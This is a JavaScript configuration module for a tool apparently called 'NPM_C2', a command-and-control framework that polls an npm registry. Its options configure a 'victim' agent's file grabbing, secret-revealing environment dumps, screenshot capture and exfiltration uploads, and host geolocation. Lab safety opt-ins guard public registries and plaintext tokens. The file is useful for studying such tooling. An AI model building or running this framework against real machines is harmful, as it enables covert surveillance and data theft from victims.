// Configuration loader: defaults < config file < environment overrides.
//
// Before anything else is read, an optional `env.sh` file (KEY=VALUE or
// `export KEY=VALUE` lines) is loaded into process.env. This is the
// supported way to keep NPM_C2_TOKEN out of your shell history while still
// supplying it "via the environment". env.sh must be git-ignored — it
// contains a secret. Real environment variables always win over env.sh.
import fs from 'node:fs';
import path from 'node:path';

export const DEFAULTS = Object.freeze({
  registryUrl: 'http://localhost:4873',
  packageName: 'my-package',
  pollIntervalSec: 10,
  agentId: '', // optional; generated and persisted by the victim if absent
  logFile: '', // '' disables file logging
  stateFile: '', // role-specific default is used when empty
  maxFileBytes: 32 * 1024, // cap for the getfile task (channel moves ~130B/tag)
  revealEnv: false, // opt-in: let the env task return real values (may expose secrets)
  downloadDir: 'downloads',
  enableFunOps: false,
  enableScreenshot: false, // opt-in: the screenshot task captures the whole screen
  screenshotMaxWidth: 1280, // starting width for the screenshot JPEG downscale-to-fit ladder
  enableGeolocate: false, // opt-in: the geolocate task discloses the host's coarse location
  geolocateServiceUrl: '', // MLS/Google-compatible WPS endpoint; '' = WiFi-scan-only mode
  geolocateServiceKey: '', // appended as ?key= when set; keep real keys in env.sh
  uploadUrl: '', // anonymous file-share endpoint for screenshot exfil demo; '' = channel transfer
  uploadUrls: [], // ordered fallback list of upload endpoints; overrides/extends uploadUrl
  allowPublicRegistry: false,
  allowInsecureHttp: false,
  logLevel: 'info',
  requestTimeoutMs: 10_000,
  maxRetries: 3,
  retryBaseDelayMs: 500,
  token: '', // only ever populated from the NPM_C2_TOKEN env var
});

const LOG_LEVELS = new Set(['debug', 'info', 'warn', 'error']);
const PACKAGE_NAME_RE = /^(?:@[a-z0-9][a-z0-9._~-]*\/)?[a-z0-9][a-z0-9._~-]*$/;
const AGENT_ID_RE = /^[A-Za-z0-9_]{1,64}$/;
const MAX_FILE_BYTES = 1024 * 1024;

/** Accept true/1/"1"/"true"/"yes" (case-insensitive); everything else is false. */
export function parseBoolFlag(value) {
  if (value === true || value === 1) return true;
  if (typeof value !== 'string') return false;
  return ['1', 'true', 'yes'].includes(value.trim().toLowerCase());
}

export function taskTtlMs(pollIntervalSec) {
  return Math.max(30_000, Number(pollIntervalSec) * 1_000) * 4;
}

const ENV_KEY_RE = /^[A-Za-z_][A-Za-z0-9_]*$/;

/**
 * Load KEY=VALUE lines from an env.sh-style file into process.env.
 * Looks at $NPM_C2_ENV_FILE first, then ./env.sh. Missing file is fine.
 * Lines already present in the real environment are NOT overridden.
 * Supports NPM_C2_* keys, blank lines, # comments, optional `export ` prefix,
 * and optional single/double quotes around values.
 * @returns {string|null} path that was loaded, or null
 */
export function loadEnvFile(envPath) {
  const file = envPath
    ? path.resolve(envPath)
    : process.env.NPM_C2_ENV_FILE
      ? path.resolve(process.env.NPM_C2_ENV_FILE)
      : path.resolve('env.sh');
  if (!fs.existsSync(file)) return null;
  if (process.platform !== 'win32' && (fs.statSync(file).mode & 0o077) !== 0) {
    throw new Error(`env file must be private; run: chmod 600 "${file}"`);
  }

  const lines = fs.readFileSync(file, 'utf8').split(/\r?\n/);
  for (const raw of lines) {
    const line = raw.trim();
    if (line === '' || line.startsWith('#')) continue;
    const body = line.startsWith('export ') ? line.slice('export '.length).trimStart() : line;
    const eq = body.indexOf('=');
    if (eq < 1) continue;
    const key = body.slice(0, eq).trim();
    if (!ENV_KEY_RE.test(key) || !key.startsWith('NPM_C2_')) continue;
    let value = body.slice(eq + 1).trim();
    if (
      value.length >= 2 &&
      ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'")))
    ) {
      value = value.slice(1, -1);
    }
    if (process.env[key] === undefined) {
      process.env[key] = value;
    }
  }
  return file;
}

/**
 * Resolve which config file to use.
 * Priority: explicit argument > $NPM_C2_CONFIG > ./config.json
 */
export function resolveConfigPath(explicitPath) {
  if (explicitPath) return path.resolve(explicitPath);
  if (process.env.NPM_C2_CONFIG) return path.resolve(process.env.NPM_C2_CONFIG);
  return path.resolve('config.json');
}

/**
 * Load configuration.
 * @param {string} [explicitPath] path to a JSON config file (may not exist)
 * @returns {object} merged, validated config
 */
/** Service endpoints must be TLS (loopback http allowed for local mocks) and credential-free. */
function assertServiceUrl(value, keyName) {
  if (!value) return;
  let parsed;
  try {
    parsed = new URL(String(value));
  } catch {
    throw new Error(`invalid ${keyName}: "${value}"`);
  }
  const loopback = ['localhost', '127.0.0.1', '::1'].includes(parsed.hostname);
  if (parsed.protocol !== 'https:' && !(parsed.protocol === 'http:' && loopback)) {
    throw new Error(`${keyName} must be https (loopback http allowed for local mock services)`);
  }
  if (parsed.username || parsed.password) {
    throw new Error(`${keyName} must not contain credentials`);
  }
}

export function loadConfig(explicitPath) {
  loadEnvFile(); // populate process.env from env.sh first (real env still wins)
  const cfg = { ...DEFAULTS };

  const filePath = resolveConfigPath(explicitPath);
  if (fs.existsSync(filePath)) {
    const raw = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    if (raw && typeof raw === 'object') {
      for (const key of Object.keys(DEFAULTS)) {
        if (raw[key] !== undefined && key !== 'token') cfg[key] = raw[key];
      }
    }
  }

  // Environment overrides
  if (process.env.NPM_C2_REGISTRY_URL) cfg.registryUrl = process.env.NPM_C2_REGISTRY_URL;
  if (process.env.NPM_C2_PACKAGE_NAME) cfg.packageName = process.env.NPM_C2_PACKAGE_NAME;
  if (process.env.NPM_C2_POLL_INTERVAL) {
    const n = Number(process.env.NPM_C2_POLL_INTERVAL);
    if (Number.isFinite(n) && n > 0) cfg.pollIntervalSec = n;
  }
  if (process.env.NPM_C2_AGENT_ID) cfg.agentId = process.env.NPM_C2_AGENT_ID;
  if (process.env.NPM_C2_LOG_FILE !== undefined) {
    cfg.logFile = process.env.NPM_C2_LOG_FILE;
  }
  if (process.env.NPM_C2_STATE_FILE) cfg.stateFile = process.env.NPM_C2_STATE_FILE;
  if (process.env.NPM_C2_MAX_FILE_BYTES) {
    const n = Number(process.env.NPM_C2_MAX_FILE_BYTES);
    if (Number.isFinite(n) && n > 0) cfg.maxFileBytes = Math.floor(n);
  }
  if (process.env.NPM_C2_REVEAL_ENV !== undefined && process.env.NPM_C2_REVEAL_ENV !== '') {
    cfg.revealEnv = parseBoolFlag(process.env.NPM_C2_REVEAL_ENV);
  }
  if (process.env.NPM_C2_DOWNLOAD_DIR) cfg.downloadDir = process.env.NPM_C2_DOWNLOAD_DIR;
  if (process.env.NPM_C2_ENABLE_FUN_OPS !== undefined && process.env.NPM_C2_ENABLE_FUN_OPS !== '') {
    cfg.enableFunOps = parseBoolFlag(process.env.NPM_C2_ENABLE_FUN_OPS);
  }
  if (process.env.NPM_C2_ENABLE_SCREENSHOT !== undefined && process.env.NPM_C2_ENABLE_SCREENSHOT !== '') {
    cfg.enableScreenshot = parseBoolFlag(process.env.NPM_C2_ENABLE_SCREENSHOT);
  }
  if (process.env.NPM_C2_SCREENSHOT_MAX_WIDTH !== undefined && process.env.NPM_C2_SCREENSHOT_MAX_WIDTH !== '') {
    cfg.screenshotMaxWidth = Number(process.env.NPM_C2_SCREENSHOT_MAX_WIDTH);
  }
  if (process.env.NPM_C2_ENABLE_GEOLOCATE !== undefined && process.env.NPM_C2_ENABLE_GEOLOCATE !== '') {
    cfg.enableGeolocate = parseBoolFlag(process.env.NPM_C2_ENABLE_GEOLOCATE);
  }
  if (process.env.NPM_C2_GEOLOCATE_URL !== undefined && process.env.NPM_C2_GEOLOCATE_URL !== '') {
    cfg.geolocateServiceUrl = process.env.NPM_C2_GEOLOCATE_URL;
  }
  if (process.env.NPM_C2_GEOLOCATE_KEY !== undefined && process.env.NPM_C2_GEOLOCATE_KEY !== '') {
    cfg.geolocateServiceKey = process.env.NPM_C2_GEOLOCATE_KEY;
  }
  if (process.env.NPM_C2_UPLOAD_URL !== undefined && process.env.NPM_C2_UPLOAD_URL !== '') {
    cfg.uploadUrl = process.env.NPM_C2_UPLOAD_URL;
  }
  if (process.env.NPM_C2_UPLOAD_URLS !== undefined && process.env.NPM_C2_UPLOAD_URLS !== '') {
    cfg.uploadUrls = process.env.NPM_C2_UPLOAD_URLS.split(',').map((u) => u.trim()).filter(Boolean);
  }
  if (process.env.NPM_C2_ALLOW_PUBLIC_REGISTRY !== undefined && process.env.NPM_C2_ALLOW_PUBLIC_REGISTRY !== '') {
    cfg.allowPublicRegistry = parseBoolFlag(process.env.NPM_C2_ALLOW_PUBLIC_REGISTRY);
  }
  if (process.env.NPM_C2_ALLOW_INSECURE_HTTP !== undefined && process.env.NPM_C2_ALLOW_INSECURE_HTTP !== '') {
    cfg.allowInsecureHttp = parseBoolFlag(process.env.NPM_C2_ALLOW_INSECURE_HTTP);
  }
  if (process.env.NPM_C2_LOG_LEVEL) cfg.logLevel = process.env.NPM_C2_LOG_LEVEL;
  if (process.env.NPM_C2_REQUEST_TIMEOUT_MS) cfg.requestTimeoutMs = Number(process.env.NPM_C2_REQUEST_TIMEOUT_MS);
  if (process.env.NPM_C2_MAX_RETRIES) cfg.maxRetries = Number(process.env.NPM_C2_MAX_RETRIES);
  if (process.env.NPM_C2_RETRY_BASE_DELAY_MS) cfg.retryBaseDelayMs = Number(process.env.NPM_C2_RETRY_BASE_DELAY_MS);

  // The auth token is ONLY ever read from the environment — never from a file.
  cfg.token = process.env.NPM_C2_TOKEN || '';

  // Validation
  let parsed;
  try {
    parsed = new URL(cfg.registryUrl);
  } catch {
    throw new Error(`invalid registryUrl: "${cfg.registryUrl}"`);
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
    throw new Error(`registryUrl must be http(s): "${cfg.registryUrl}"`);
  }
  if (parsed.username || parsed.password) {
    throw new Error('registryUrl must not contain credentials; use NPM_C2_TOKEN');
  }
  if (parsed.search || parsed.hash) {
    throw new Error('registryUrl must not contain a query string or fragment');
  }
  cfg.registryUrl = parsed.href.replace(/\/+$/, '');
  if (typeof cfg.packageName !== 'string' || cfg.packageName.length > 214 || !PACKAGE_NAME_RE.test(cfg.packageName)) {
    throw new Error('packageName must be a valid lowercase npm package name');
  }
  if (cfg.agentId && !AGENT_ID_RE.test(cfg.agentId)) {
    throw new Error('agentId must contain 1-64 ASCII letters, digits, or underscores');
  }
  cfg.pollIntervalSec = Number(cfg.pollIntervalSec);
  if (!Number.isFinite(cfg.pollIntervalSec) || cfg.pollIntervalSec <= 0) {
    throw new Error(`pollIntervalSec must be a positive number, got ${cfg.pollIntervalSec}`);
  }
  if (!Number.isFinite(Number(cfg.maxFileBytes)) || Number(cfg.maxFileBytes) <= 0) {
    throw new Error(`maxFileBytes must be a positive number, got ${cfg.maxFileBytes}`);
  }
  cfg.maxFileBytes = Math.floor(Number(cfg.maxFileBytes));
  if (cfg.maxFileBytes > MAX_FILE_BYTES) {
    throw new Error(`maxFileBytes must not exceed ${MAX_FILE_BYTES}`);
  }
  cfg.revealEnv = parseBoolFlag(cfg.revealEnv);
  cfg.enableFunOps = parseBoolFlag(cfg.enableFunOps);
  cfg.enableScreenshot = parseBoolFlag(cfg.enableScreenshot);
  cfg.screenshotMaxWidth = Number(cfg.screenshotMaxWidth);
  if (!Number.isInteger(cfg.screenshotMaxWidth) || cfg.screenshotMaxWidth < 160 || cfg.screenshotMaxWidth > 7680) {
    throw new Error('screenshotMaxWidth must be an integer from 160 to 7680');
  }
  cfg.enableGeolocate = parseBoolFlag(cfg.enableGeolocate);
  assertServiceUrl(cfg.geolocateServiceUrl, 'geolocateServiceUrl');
  assertServiceUrl(cfg.uploadUrl, 'uploadUrl');
  if (!Array.isArray(cfg.uploadUrls)) {
    throw new Error('uploadUrls must be an array of service endpoints');
  }
  for (const entry of cfg.uploadUrls) {
    if (typeof entry !== 'string' || !entry) {
      throw new Error('uploadUrls entries must be non-empty strings');
    }
    assertServiceUrl(entry, 'uploadUrls entry');
  }
  cfg.allowPublicRegistry = parseBoolFlag(cfg.allowPublicRegistry);
  cfg.allowInsecureHttp = parseBoolFlag(cfg.allowInsecureHttp);
  cfg.downloadDir = path.resolve(String(cfg.downloadDir));
  if (!LOG_LEVELS.has(cfg.logLevel)) {
    throw new Error(`logLevel must be one of ${[...LOG_LEVELS].join(', ')}`);
  }
  cfg.requestTimeoutMs = Number(cfg.requestTimeoutMs);
  if (!Number.isInteger(cfg.requestTimeoutMs) || cfg.requestTimeoutMs < 100 || cfg.requestTimeoutMs > 120_000) {
    throw new Error('requestTimeoutMs must be an integer from 100 to 120000');
  }
  cfg.maxRetries = Number(cfg.maxRetries);
  if (!Number.isInteger(cfg.maxRetries) || cfg.maxRetries < 0 || cfg.maxRetries > 10) {
    throw new Error('maxRetries must be an integer from 0 to 10');
  }
  cfg.retryBaseDelayMs = Number(cfg.retryBaseDelayMs);
  if (!Number.isInteger(cfg.retryBaseDelayMs) || cfg.retryBaseDelayMs < 10 || cfg.retryBaseDelayMs > 60_000) {
    throw new Error('retryBaseDelayMs must be an integer from 10 to 60000');
  }
  if (cfg.token === 'npm_replace_me') {
    throw new Error('NPM_C2_TOKEN is still the example placeholder; set a real scoped token');
  }
  const isLoopback = ['localhost', '127.0.0.1', '::1'].includes(parsed.hostname);
  if (cfg.token && parsed.protocol === 'http:' && !isLoopback && !cfg.allowInsecureHttp) {
    throw new Error('refusing to send NPM_C2_TOKEN over plaintext HTTP; set allowInsecureHttp only for an isolated lab');
  }
  if (parsed.hostname === 'registry.npmjs.org' && !cfg.allowPublicRegistry) {
    throw new Error('registry.npmjs.org requires the explicit allowPublicRegistry safety opt-in');
  }

  return cfg;
}

/** Parse `--config <path>` (or `--config=<path>`) from argv. */
export function configArgFromArgv(argv = process.argv.slice(2)) {
  for (let i = 0; i < argv.length; i++) {
    if (argv[i] === '--config' && argv[i + 1]) return argv[i + 1];
    if (argv[i].startsWith('--config=')) return argv[i].slice('--config='.length);
  }
  return undefined;
}
